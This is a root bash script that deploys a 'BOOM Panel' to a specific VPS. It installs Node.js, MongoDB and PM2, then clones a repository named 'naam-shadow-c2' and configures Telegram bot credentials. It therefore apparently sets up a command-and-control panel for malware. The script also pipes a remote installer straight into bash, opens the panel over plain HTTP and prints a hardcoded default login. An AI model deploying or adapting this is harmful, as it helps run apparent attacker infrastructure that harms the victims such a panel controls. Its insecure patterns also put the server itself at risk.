#!/bin/bash
# BOOM Panel - VPS Deploy Script
# Run as root on Ubuntu 24.04 at 187.77.155.206
# Usage: bash deploy.sh

set -e

echo "=== BOOM Panel Deploy ==="

# Install Node.js 20
if ! command -v node &>/dev/null; then
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
  apt-get install -y nodejs
fi

# Install MongoDB
if ! command -v mongod &>/dev/null; then
  apt-get install -y gnupg curl
  curl -fsSL https://www.mongodb.org/static/pgp/server-7.0.asc | gpg -o /usr/share/keyrings/mongodb-server-7.0.gpg --dearmor
  echo "deb [ arch=amd64,arm64 signed-by=/usr/share/keyrings/mongodb-server-7.0.gpg ] https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/7.0 multiverse" \
    > /etc/apt/sources.list.d/mongodb-org-7.0.list
  apt-get update
  apt-get install -y mongodb-org
  systemctl enable mongod
  systemctl start mongod
fi

# Install PM2
npm install -g pm2 2>/dev/null || true

# Clone / update repo
REPO_DIR="/opt/boom-panel"
if [ -d "$REPO_DIR/.git" ]; then
  cd "$REPO_DIR" && git pull
else
  git clone https://github.com/korepreeti003-ai/naam-shadow-c2 "$REPO_DIR"
  cd "$REPO_DIR"
fi

# Server deps
cd "$REPO_DIR/server"
npm install --production

# Create .env if missing
if [ ! -f .env ]; then
  cp .env.example .env
  sed -i "s|YOUR_BOT_TOKEN_HERE|${TG_BOT_TOKEN:-FILL_IN}|" .env
  sed -i "s|YOUR_CHAT_ID_HERE|${TG_CHAT_ID:-FILL_IN}|" .env
  JWT=$(openssl rand -hex 32)
  sed -i "s|change_this_to_random_string_32chars|$JWT|" .env
  echo ".env created — review it: $REPO_DIR/server/.env"
fi

# Start with PM2
pm2 delete boom-panel 2>/dev/null || true
pm2 start index.js --name boom-panel --max-memory-restart 512M
pm2 save
pm2 startup systemd -u root --hp /root | tail -1 | bash || true

# Firewall
ufw allow 22/tcp
ufw allow 3000/tcp
ufw --force enable

echo ""
echo "=== DONE ==="
echo "Panel server: http://187.77.155.206:3000"
echo "Default login: admin / boom@2025"
echo "Change password after first login!"
pm2 status
